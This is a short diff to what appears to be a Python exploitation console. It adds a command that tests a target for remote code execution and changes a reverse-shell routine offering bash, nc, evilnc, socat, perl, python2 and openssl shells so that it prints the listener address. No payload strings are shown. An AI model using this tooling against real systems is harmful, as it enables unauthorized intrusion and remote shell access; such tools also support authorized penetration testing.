@@ -110,6 +110,18 @@ class Terminal(cmd.Cmd):
         print("Exiting.")
         sys.exit(0)
     
+    def do_check(self, args):
+        """
+        Checks for code execution. Makes no changes, just sets variable in memory and attempts to
+        echo its contents.
+        """
+        if test_for_code_exec(self.target, self.invoke_word, proxy_string=self.proxy_string):
+            print("Test succeeded!")
+        else:
+            print("Code Execution test failed!")
+            print("This does not mean it didn't work, just that there is no output.")
+            print("To check for blind code execution, issue a pingback and listen with tcpdump.")
+    
     def do_shellset(self, args):
         """
         Sets options during runtime, so you can change settings without having to
@@ -202,6 +214,9 @@ class Terminal(cmd.Cmd):
         openssl -- uses openssl to create a secure reverse shell. Needs openssl client-side to communicate.
         """
         shelltypes = ('bash', 'evilnc', 'nc', 'socat', 'perl', 'python2', 'openssl',)
+        print("Ensure that your listener is working with the following:")
+        print(f"Listening IP: {self.lhost}")
+        print(f"Listening Port: {self.lport}")
         if shelltype in shelltypes:
             if shelltype == 'bash':
                 print("Is your listener running? Then you'd better catch it!")
